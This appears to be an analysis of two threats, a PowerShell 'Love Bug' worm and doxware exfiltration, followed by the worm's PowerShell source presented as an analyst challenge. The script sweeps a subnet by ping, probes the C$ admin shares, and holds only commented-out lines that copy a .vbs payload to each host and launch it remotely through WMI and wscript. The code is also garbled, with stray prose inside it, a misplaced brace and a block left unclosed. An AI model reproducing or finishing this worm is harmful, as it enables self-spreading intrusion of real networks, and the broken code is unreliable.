Comparative Threat Analysis: Worm Propagation vs. Doxware Exfiltration *A professional static analysis of lateral network movement and malicious data extraction logic loops.* ## 

1. Case Study 1: The Modern "Love Bug" PowerShell Worm Engine ### A. De-Venomed Code Map ```text [Static Blueprint] Lateral Movement Core: Process Module: powershell[.]exe Target Identifier: 
 $PayloadPackage = "LOVE-LETTER-UPDATE[.]vbs" Target Subnet Scope: 192.168.1[.]0/24 Network Protocol Call: Test-Connection (ICMP Ping sweep) Target Administrative Vector: \\$RemoteHost\C$\Windows\System32 Remote Process Injection: Invoke-CimMethod -> Win32_Process -> wscript[.]exe ``` ### B. Behavioral Analysis in the Wild * 

 **The Attachment Masking Trick (`$PayloadPackage`):** The code establishes an artifact labeled `LOVE-LETTER-UPDATE[.]vbs`. In the wild, this relies heavily on social engineering, tricking an end-user into opening an email attachment thinking it is a benign file, which drops a Visual Basic Script (VBS) execution chain into memory. * **Automated Subnet Scanning (`For ($Node =

 2; $Node -le 254...)`):
Once execution drops on a single infected workstation, the worm acts entirely independent of human commands. It runs a rapid, automated sequential loop that acts as a reconnaissance engine, pinging every adjacent computer on the local network (`192.168.1[.]2` through `192.168.1[.]254`). * **
Lateral Movement via Admin Shares (`\C$\`):** The script validates network pathways to discover exposed Windows administrative shares (`C$\Windows\System32`). 
If the current compromised user has domain administrative rights, the worm automatically copies its source binary over the network bridge (`Copy-Item`) to the new machine. * **Remote Execution Ignition (`Invoke-CimMethod`):** 
To execute the payload on the newly targeted network device without physical intervention, the script uses Windows Management Instrumentation (WMI) to remotely launch `wscript[.]exe`, starting the entire replication cycle over again on the next computer. --- ## 

2. Case Study 
2: Doxware Data Harvesting Matrix ### A. De-Venomed Code Map ```text [Static Blueprint] Data Exfiltration Core: Target Range Scope: 10.0.0[.]10 to 10.0.0[.]20 Target Artifact Key: system_diagnostic_report[.]txt Logic Mechanism: Sequential Iterative Conditional Sweep Operational Focus: Surgical Document Extraction / Host Surveillance ``` ### 
B. Behavioral Analysis in the Wild 
*The Triage Scan (`Start-DiagnosticSweep`):
Doxware differs completely from standard ransomware. 
While standard ransomware encrypts files locally to deny access, Doxware targets **confidentiality**. 
It scans specialized IP subnets (`10.0.0[.]x`) seeking file sharing paths where corporate documentation, financial records, or private personnel data are stored. * **Targeted Document Extraction:** As noted in the structural breakdown, the script targets files containing high-value private indicators. 
The logic loops look specifically for keywords, txt files, and database schemas. * **Exfiltration Strategy:** Once the verification path (`\\$VirtualTarget\SharedFolder\`) returns positive data feedback, the extraction mechanics compress these files in memory and upload them to a remote repository. This data is then used as leverage in double-extortion campaigns, threatening public release if payments are not met



powershell - Love Bug Worm
# Final Analyst Challenge - Worm Propagation Engine
$SelfPath        = $MyInvocation.MyCommand.Path
$PayloadPackage  = "LOVE-LETTER-UPDATE.vbs" - Attachment trick to get you to open the Attachment and activate the Virus
$TargetIPSubnet  = "192.168.1."

Function Start-NetworkPropagation {
    Write-Output "Initialization complete. Querying local ARP cache..."
    
    # Logic Loop: Scanning active local network connections -- Scans files to overwrite then and Replicate itself to keep moving across the network
    For ($Node = 2; $Node -le 254; $Node++) {
        $RemoteHost = "$TargetIPSubnet$Node"
        
        # Testing network access to adjacent machines - File Access to activate Writeover Code and keep moving 
        If (Test-Connection -ComputerName $RemoteHost -Count 1 -Quiet) } - Ransomware part of the worm
            Write-Output "Active target identified at $RemoteHost. Assessing admin shares..."
           
 $SharedPath = "\\$RemoteHost\C$\Windows\System32". - File search for exposed files to be copied 
            
            If (Test-Path $SharedPath) {
                Write-Output "Admin write privileges verified on $RemoteHost. Executing lateral movement..."
                
                # [Surgical Replication Trigger Phase]
                # Copy-Item -Path $SelfPath -Destination "$SharedPath\$PayloadPackage" -Force
                
                # Executing the payload copy remotely
                # [WMI/psexec Trigger Engine]
                # Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "wscript.exe C:\Windows\System32\$PayloadPackage" } -ComputerName $RemoteHost
            }
        }
    }
}

# Execution Check: Ensure script isn't running in an empty network loop
$LocalInterfaces = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" }
If ($LocalInterfaces.Count -gt 0) {
    Start-NetworkPropagation
} Else {
    Exit
